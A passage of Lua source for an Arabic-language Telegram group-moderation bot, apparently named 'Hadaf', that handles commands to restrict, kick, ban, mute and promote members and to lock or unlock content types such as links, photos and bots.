Send_Options(msg,result.id_,"reply","✅┇تم تقييده في المجموعه")  
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تقييد @(.*)$")}, FunctionStatus, nil)
elseif text and text:match('^تقييد (%d+) (.*) @(.*)$') and Admin(msg) then
local TextEnd = {string.match(text, "^(تقييد) (%d+) (.*) @(.*)$")}
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"⚠️┇عذرًا البوت ليس ادمن") 
return false  
end
function FunctionStatus(arg, result)
if (result.id_) then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠️┇عذرًا هذا معرف قناة")   
return false 
end      
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Rank_Checking(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n⚠️┇لا تستطيع -( حظر , طرد , كتم , تقييد ) : "..Get_Rank(result.id_,msg.chat_id_).."")
else
Send_Options(msg,result.id_,"reply", "✅┇تم تقييده لمدة ~ { "..TextEnd[2]..' '..TextEnd[3]..'}')
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_..'&until_date='..tonumber(msg.date_+Time))
end
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = TextEnd[4]}, FunctionStatus, nil)
elseif text and text:match("^الغاء التقييد @(.*)$") and Admin(msg) then

function FunctionStatus(arg, result)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"⚠️┇عذرًا البوت ليس ادمن") 
return false  
end
if (result.id_) then
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
Send_Options(msg,result.id_,"reply","✅┇تم الغاء تقييده")  
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^الغاء التقييد @(.*)$")}, FunctionStatus, nil)
elseif text and text:match("^طرد @(.*)$") and Admin(msg) then
 
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"⚠️┇عذرًا البوت ليس ادمن") 
return false  
end
if not Constructor(msg) and redis:get(bot_id.."Hadaf:Lock:Ban:Group"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'✅┇لقد تم تعطيل الحظر و الطرد من قبل المنشئين')
return false
end
function FunctionStatus(arg, result)
if (result.id_) then
if Rank_Checking(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\n⚠️┇لا تستطيع -( حظر , طرد , كتم , تقييد ) : "..Get_Rank(result.id_,msg.chat_id_).."")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠️┇عذرًا هذا معرف قناة")   
return false 
end      
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"⚠️┇لا توجد لدي صلاحية حظر المستخدمين") 
return false  
end
KickGroup(msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","✅┇تم طرده من هنا")  
end,nil)   
end
else
send(msg.chat_id_, msg.id_,"❌┇المعرف غلط ")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^طرد @(.*)$")}, FunctionStatus, nil)
elseif text and text:match("^حظر عام (%d+)$") and Dev_Hadaf(msg) then

if Dev_Hadaf_User(text:match("^حظر عام (%d+)$")) == true then
send(msg.chat_id_, msg.id_, "⚠️┇لا تستطيع حظر المطور الاساسي عام")
return false 
end
if tonumber(text:match("^حظر عام (%d+)$")) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "⚠️┇لا تسطيع حظر البوت عام")
return false 
end
redis:sadd(bot_id.."Hadaf:Removal:User:Groups", text:match("^حظر عام (%d+)$"))
Send_Options(msg,text:match("^حظر عام (%d+)$"),"reply","✅┇تم حظره عام من المجموعات")  
elseif text and text:match("^الغاء العام (%d+)$") and Dev_Hadaf(msg) then

redis:srem(bot_id.."Hadaf:Removal:User:Groups", text:match("^الغاء العام (%d+)$"))
Send_Options(msg,text:match("^الغاء العام (%d+)$"),"reply","✅┇تم الغاء حظره عام من المجموعات")  
return false
end
if text and text:match("^اضف مطور (%d+)$") and Dev_Hadaf(msg) then

redis:sadd(bot_id.."Hadaf:Developer:Bot", text:match("^اضف مطور (%d+)$"))
Send_Options(msg,text:match("^اضف مطور (%d+)$"),"reply","✅┇تم ترقيته مطور في البوت")  
elseif text and text:match("^حذف مطور (%d+)$") and Dev_Hadaf(msg) then

redis:srem(bot_id.."Hadaf:Developer:Bot", text:match("^حذف مطور (%d+)$"))
Send_Options(msg,text:match("^حذف مطور (%d+)$"),"reply","✅┇تم تنزيله من المطورين")  
elseif text and text:match("^رفع منشئ اساسي (%d+)$") and DeveloperBot(msg) then
 
redis:sadd(bot_id.."Hadaf:President:Group"..msg.chat_id_, text:match("^رفع منشئ اساسي (%d+)$") )
Send_Options(msg,text:match("^رفع منشئ اساسي (%d+)$") ,"reply","✅┇تم ترقيته منشئ اساسي")  
elseif text and text:match("^تنزيل منشئ اساسي (%d+)$") and DeveloperBot(msg) then
 
redis:srem(bot_id.."Hadaf:President:Group"..msg.chat_id_, text:match("^تنزيل منشئ اساسي (%d+)$") )
Send_Options(msg,text:match("^تنزيل منشئ اساسي (%d+)$") ,"reply","✅┇تم تنزيله من المنشئين")  
elseif text and text:match("^رفع منشئ (%d+)$") and PresidentGroup(msg) then
 
redis:sadd(bot_id.."Hadaf:Constructor:Group"..msg.chat_id_, text:match("^رفع منشئ (%d+)$"))
Send_Options(msg,text:match("^رفع منشئ (%d+)$"),"reply","✅┇تم ترقيته منشئ في المجموعه")  
elseif text and text:match("^تنزيل منشئ (%d+)$") and PresidentGroup(msg) then
 
redis:srem(bot_id.."Hadaf:Constructor:Group"..msg.chat_id_, text:match("^تنزيل منشئ (%d+)$"))
Send_Options(msg,text:match("^تنزيل منشئ (%d+)$"),"reply","✅┇تم تنزيله من المنشئين")  
elseif text and text:match("^رفع مدير (%d+)$") and Constructor(msg) then
 
redis:sadd(bot_id.."Hadaf:Manager:Group"..msg.chat_id_, text:match("^رفع مدير (%d+)$") )
Send_Options(msg,text:match("^رفع مدير (%d+)$") ,"reply","✅┇تم ترقيته مدير المجموعه")  
elseif text and text:match("^تنزيل مدير (%d+)$") and Constructor(msg) then
 
redis:srem(bot_id.."Hadaf:Manager:Group"..msg.chat_id_, text:match("^تنزيل مدير (%d+)$") )
Send_Options(msg,text:match("^تنزيل مدير (%d+)$") ,"reply","✅┇تم تنزيله من المدراء")  
elseif text and text:match("^رفع ادمن (%d+)$") and Owner(msg) then
 
if not Constructor(msg) and redis:get(bot_id.."Hadaf:Cheking:Seted"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'✖┇لا تستطيع رفع احد وذلك لانه تم تعطيل الرفع من قبل المنشئين')
return false
end
redis:sadd(bot_id.."Hadaf:Admin:Group"..msg.chat_id_, text:match("^رفع ادمن (%d+)$"))
Send_Options(msg,text:match("^رفع ادمن (%d+)$"),"reply","✅┇تم ترقيته ادمن للمجموعه")  
elseif text and text:match("^تنزيل ادمن (%d+)$") and Owner(msg) then
 
redis:srem(bot_id.."Hadaf:Admin:Group"..msg.chat_id_, text:match("^تنزيل ادمن (%d+)$"))
Send_Options(msg,text:match("^تنزيل ادمن (%d+)$"),"reply","✅┇تم تنزيله من ادمنيه المجموعه")  
elseif text and text:match("^رفع مميز (%d+)$") and Admin(msg) then
 
if not Constructor(msg) and redis:get(bot_id.."Hadaf:Cheking:Seted"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'✖┇لا تستطيع رفع احد وذلك لانه تم تعطيل الرفع من قبل المنشئين')
return false
end
redis:sadd(bot_id.."Hadaf:Vip:Group"..msg.chat_id_, text:match("^رفع مميز (%d+)$"))
Send_Options(msg,text:match("^رفع مميز (%d+)$"),"reply","✅┇تم ترقيته مميز للمجموعه")  
elseif text and text:match("^تنزيل مميز (%d+)$") and Admin(msg) then
 
redis:srem(bot_id.."Hadaf:Vip:Group"..msg.chat_id_, text:match("^تنزيل مميز (%d+)$") )
Send_Options(msg,text:match("^تنزيل مميز (%d+)$") ,"reply","✅┇تم تنزيله من المميزين")  
elseif text and text:match("^حظر (%d+)$") and Admin(msg) then

if not Constructor(msg) and redis:get(bot_id.."Hadaf:Lock:Ban:Group"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'✅┇لقد تم تعطيل الحظر و الطرد من قبل المنشئين')
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"⚠️┇عذرًا البوت ليس ادمن") 
return false  
end
if Rank_Checking(text:match("^حظر (%d+)$") , msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\n⚠️┇لا تستطيع -( حظر , طرد , كتم , تقييد ) : "..Get_Rank(userid,msg.chat_id_).."")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = text:match("^حظر (%d+)$") , status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"⚠️┇لا توجد لدي صلاحية حظر المستخدمين") 
return false  
end
redis:sadd(bot_id.."Hadaf:Removal:User:Group"..msg.chat_id_, text:match("^حظر (%d+)$") )
KickGroup(msg.chat_id_, text:match("^حظر (%d+)$") )  
Send_Options(msg,text:match("^حظر (%d+)$") ,"reply","✅┇تم حظره من المجموعه")  
end,nil)   
end
elseif text and text:match("^الغاء الحظر (%d+)$") and Admin(msg) then

if tonumber(text:match("^الغاء الحظر (%d+)$") ) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, "✅️┇لا يمكنك عمل هذا الامر على البوت") 
return false 
end
redis:srem(bot_id.."Hadaf:Removal:User:Group"..msg.chat_id_, text:match("^الغاء الحظر (%d+)$") )
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = text:match("^الغاء الحظر (%d+)$") , status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
Send_Options(msg,text:match("^الغاء الحظر (%d+)$") ,"reply","✅┇تم الغاء حظره من هنا")  
elseif text and text:match("^كتم (%d+)$") and Admin(msg) then

if Rank_Checking(text:match("^كتم (%d+)$"), msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\n⚠️┇لا تستطيع -( حظر , طرد , كتم , تقييد ) : "..Get_Rank(userid,msg.chat_id_).."")
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"⚠️┇عذرًا البوت ليس ادمن") 
return false  
end
if Rank_Checking(text:match("^كتم (%d+)$"), msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n⚠️┇لا تستطيع -( حظر , طرد , كتم , تقييد ) : "..Get_Rank(result.id_,msg.chat_id_).."")
return false 
end      
redis:sadd(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_, text:match("^كتم (%d+)$"))
Send_Options(msg,text:match("^كتم (%d+)$"),"reply","✅┇تم كتمه من هنا")  
end
elseif text and text:match("^الغاء الكتم (%d+)$") and Admin(msg) then

redis:srem(bot_id.."Hadaf:Silence:User:Group"..msg.chat_id_,text:match("^الغاء الكتم (%d+)$") )
Send_Options(msg,text:match("^الغاء الكتم (%d+)$") ,"reply","✅┇تم الغاء كتمه من هنا")  
elseif text and text:match("^تقييد (%d+)$") and Admin(msg) then
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"⚠️┇عذرًا البوت ليس ادمن") 
return false  
end
if Rank_Checking(text:match("^تقييد (%d+)$"), msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n⚠️┇لا تستطيع -( حظر , طرد , كتم , تقييد ) : "..Get_Rank(userid,msg.chat_id_).."")
else
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..text:match("^تقييد (%d+)$"))
Send_Options(msg,userid,"reply","✅┇تم تقييده في المجموعه")  
end
elseif text and text:match('^تقييد (%d+) (.*)$') and tonumber(msg.reply_to_message_id_) ~= 0 and Admin(msg) then
local TextEnd = {string.match(text, "^(تقييد) (%d+) (.*)$")}
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"⚠️┇عذرًا البوت ليس ادمن") 
return false  
end
function FunctionStatus(arg, result)
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Rank_Checking(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n⚠️┇لا تستطيع -( حظر , طرد , كتم , تقييد ) : "..Get_Rank(result.sender_user_id_,msg.chat_id_).."")
else
Send_Options(msg,result.sender_user_id_,"reply", "✅┇تم تقييده لمدة ~ { "..TextEnd[2]..' '..TextEnd[3]..'}')
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+Time))
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
elseif text and text:match("^الغاء التقييد (%d+)$") and Admin(msg) then
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"⚠️┇عذرًا البوت ليس ادمن") 
return false  
end
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..text:match("^الغاء التقييد (%d+)$").. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
Send_Options(msg,text:match("^الغاء التقييد (%d+)$"),"reply","✅┇تم الغاء تقييده")  
elseif text == ("طرد") and msg.reply_to_message_id_ ~=0 and Admin(msg) then
if not Constructor(msg) and redis:get(bot_id.."Hadaf:Lock:Ban:Group"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'✅┇لقد تم تعطيل الحظر و الطرد من قبل المنشئين')
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"⚠️┇عذرًا البوت ليس ادمن") 
return false  
end
function FunctionStatus(arg, result)
if Rank_Checking(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\n⚠️┇لا تستطيع -( حظر , طرد , كتم , تقييد ) : "..Get_Rank(result.sender_user_id_,msg.chat_id_).."")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"⚠️┇لا توجد لدي صلاحية حظر المستخدمين") 
return false  
end
KickGroup(result.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","✅┇تم طرده من هنا")  
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
elseif text and text:match("^طرد (%d+)$") and Admin(msg) then 
if not Constructor(msg) and redis:get(bot_id.."Hadaf:Lock:Ban:Group"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'✅┇لقد تم تعطيل الحظر و الطرد من قبل المنشئين')
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"⚠️┇عذرًا البوت ليس ادمن") 
return false  
end
if Rank_Checking(text:match("^طرد (%d+)$") , msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\n⚠️┇لا تستطيع -( حظر , طرد , كتم , تقييد ) : "..Get_Rank(userid,msg.chat_id_).."")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = text:match("^طرد (%d+)$") , status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"⚠️┇لا توجد لدي صلاحية حظر المستخدمين") 
return false  
end
KickGroup(msg.chat_id_, text:match("^طرد (%d+)$") )
Send_Options(msg,text:match("^طرد (%d+)$") ,"reply","✅┇تم طرده من هنا")  
end,nil)   
end
elseif text == "قفل المحادثه" and msg.reply_to_message_id_ == 0 and Owner(msg) then 
redis:set(bot_id.."Hadaf:Lock:text"..msg.chat_id_,true) 
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل المحادثه")  
elseif text == "قفل الاضافه" and msg.reply_to_message_id_ == 0 and Admin(msg) then 
redis:set(bot_id.."Hadaf:Lock:AddMempar"..msg.chat_id_,"kick")  
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل اضافة الاعضاء")  
elseif text == "قفل الدخول" and msg.reply_to_message_id_ == 0 and Admin(msg) then 
redis:set(bot_id.."Hadaf:Lock:Join"..msg.chat_id_,"kick")  
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل دخول الاعضاء")  
elseif text == "قفل البوتات" and msg.reply_to_message_id_ == 0 and Admin(msg) then 
redis:set(bot_id.."Hadaf:Lock:Bot:kick"..msg.chat_id_,"del")  
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل البوتات")  
elseif text == "قفل البوتات بالطرد" and msg.reply_to_message_id_ == 0 and Admin(msg) then 
redis:set(bot_id.."Hadaf:Lock:Bot:kick"..msg.chat_id_,"kick")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","✅┇تم قفـل البوتات")  
elseif text == "قفل الاشعارات" and msg.reply_to_message_id_ == 0 and Admin(msg) then  
redis:set(bot_id.."Hadaf:Lock:tagservr"..msg.chat_id_,true)  
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل الاشعارات")  
elseif text == "قفل التثبيت" and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
redis:set(bot_id.."Hadaf:lockpin"..msg.chat_id_, true) 
redis:sadd(bot_id.."Hadaf:Lock:pin",msg.chat_id_) 
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  redis:set(bot_id.."Hadaf:Get:Id:Msg:Pin"..msg.chat_id_,data.pinned_message_id_)  end,nil)
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل التثبيت هنا")  
elseif text == "قفل التعديل" and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
redis:set(bot_id.."Hadaf:Lock:edit"..msg.chat_id_,true) 
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل تعديل")  
elseif text == "قفل تعديل الوسائط" and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
redis:set(bot_id.."Hadaf:Lock:edit"..msg.chat_id_,true) 
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل تعديل")  
elseif text == "قفل الكل" and msg.reply_to_message_id_ == 0 and Constructor(msg) then  
redis:set(bot_id.."Hadaf:Lock:tagservrbot"..msg.chat_id_,true)   
list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
for i,lock in pairs(list) do;redis:set(bot_id..lock..msg.chat_id_,"del");end
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل جميع الاوامر")  
elseif text == "فتح الاضافه" and msg.reply_to_message_id_ == 0 and Admin(msg) then 
redis:del(bot_id.."Hadaf:Lock:AddMempar"..msg.chat_id_)  
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فتح اضافة الاعضاء")  
elseif text == "فتح المحادثه" and msg.reply_to_message_id_ == 0 and Owner(msg) then 
redis:del(bot_id.."Hadaf:Lock:text"..msg.chat_id_)  
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فتح المحادثه")  
elseif text == "فتح الدخول" and msg.reply_to_message_id_ == 0 and Admin(msg) then 
redis:del(bot_id.."Hadaf:Lock:Join"..msg.chat_id_)  
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فتح دخول الاعضاء")  
elseif text == "فتح البوتات" and msg.reply_to_message_id_ == 0 and Admin(msg) then 
redis:del(bot_id.."Hadaf:Lock:Bot:kick"..msg.chat_id_)  
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فـتح البوتات")  
elseif text == "فتح البوتات " and msg.reply_to_message_id_ == 0 and Admin(msg) then 
redis:del(bot_id.."Hadaf:Lock:Bot:kick"..msg.chat_id_)  
Send_Options(msg,msg.sender_user_id_,"Open_Status","🍃\n✅┇تم فـتح البوتات")  
elseif text == "فتح الاشعارات" and msg.reply_to_message_id_ == 0 and Admin(msg) then  
redis:del(bot_id.."Hadaf:Lock:tagservr"..msg.chat_id_)  
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فـتح الاشعارات")  
elseif text == "فتح التثبيت" and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
redis:del(bot_id.."Hadaf:lockpin"..msg.chat_id_)  
redis:srem(bot_id.."Hadaf:Lock:pin",msg.chat_id_)
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فـتح التثبيت هنا")  
elseif text == "فتح التعديل" and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
redis:del(bot_id.."Hadaf:Lock:edit"..msg.chat_id_) 
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فـتح تعديل")  
elseif text == "فتح تعديل الوسائط" and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
redis:del(bot_id.."Hadaf:Lock:edit"..msg.chat_id_) 
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فـتح تعديل")  
elseif text == "فتح الكل" and msg.reply_to_message_id_ == 0 and Admin(msg) then 
redis:del(bot_id.."Hadaf:Lock:tagservrbot"..msg.chat_id_)   
list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
for i,lock in pairs(list) do;redis:del(bot_id..lock..msg.chat_id_);end
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فـتح جميع الاوامر")  
elseif text == "قفل الروابط" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Link"..msg.chat_id_,"del")  
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل الروابط")  
elseif text == "قفل الروابط بالتقييد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Link"..msg.chat_id_,"ked")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","✅┇تم قفـل الروابط")  
elseif text == "قفل الروابط بالكتم" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Link"..msg.chat_id_,"ktm")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","✅┇تم قفـل الروابط")  
elseif text == "قفل الروابط بالطرد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Link"..msg.chat_id_,"kick")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","✅┇تم قفـل الروابط")  
elseif text == "فتح الروابط" and Admin(msg) then
redis:del(bot_id.."Hadaf:Lock:Link"..msg.chat_id_)  
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فتح الروابط")  
elseif text == "قفل المعرفات" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:User:Name"..msg.chat_id_,"del")  
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل المعرفات")  
elseif text == "قفل المعرفات بالتقييد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:User:Name"..msg.chat_id_,"ked")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","✅┇تم قفـل المعرفات")  
elseif text == "قفل المعرفات بالكتم" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:User:Name"..msg.chat_id_,"ktm")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","✅┇تم قفـل المعرفات")  
elseif text == "قفل المعرفات بالطرد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:User:Name"..msg.chat_id_,"kick")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","✅┇تم قفـل المعرفات")  
elseif text == "فتح المعرفات" and Admin(msg) then
redis:del(bot_id.."Hadaf:Lock:User:Name"..msg.chat_id_)  
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فتح المعرفات")  
elseif text == "قفل النداء" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:hashtak"..msg.chat_id_,"del")  
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل النداء")  
elseif text == "قفل النداء بالتقييد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:hashtak"..msg.chat_id_,"ked")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","✅┇تم قفـل النداء")  
elseif text == "قفل النداء بالكتم" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:hashtak"..msg.chat_id_,"ktm")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","✅┇تم قفـل النداء")  
elseif text == "قفل النداء بالطرد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:hashtak"..msg.chat_id_,"kick")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","✅┇تم قفـل النداء")  
elseif text == "فتح النداء" and Admin(msg) then
redis:del(bot_id.."Hadaf:Lock:hashtak"..msg.chat_id_)  
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فتح النداء")  
elseif text == "قفل الشارحه" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Cmd"..msg.chat_id_,"del")  
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل الشارحه")  
elseif text == "قفل الشارحه بالتقييد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Cmd"..msg.chat_id_,"ked")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","✅┇تم قفـل الشارحه")  
elseif text == "قفل الشارحه بالكتم" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Cmd"..msg.chat_id_,"ktm")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","✅┇تم قفـل الشارحه")  
elseif text == "قفل الشارحه بالطرد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Cmd"..msg.chat_id_,"kick")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","✅┇تم قفـل الشارحه")  
elseif text == "فتح الشارحه" and Admin(msg) then
redis:del(bot_id.."Hadaf:Lock:Cmd"..msg.chat_id_)  
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فتح الشارحه")  
elseif text == "قفل الصور"and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Photo"..msg.chat_id_,"del")  
Send_Options(msg,msg.sender_user_id_,"Close_Status","✅┇تم قفـل الصور")  
elseif text == "قفل الصور بالتقييد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Photo"..msg.chat_id_,"ked")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kid","✅┇تم قفـل الصور")  
elseif text == "قفل الصور بالكتم" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Photo"..msg.chat_id_,"ktm")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Ktm","✅┇تم قفـل الصور")  
elseif text == "قفل الصور بالطرد" and Admin(msg) then
redis:set(bot_id.."Hadaf:Lock:Photo"..msg.chat_id_,"kick")  
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","✅┇تم قفـل الصور")  
elseif text == "فتح الصور" and Admin(msg) then
redis:del(bot_id.."Hadaf:Lock:Photo"..msg.chat_id_)  
Send_Options(msg,msg.sender_user_id_,"Open_Status","✅┇تم فتح الصور")  
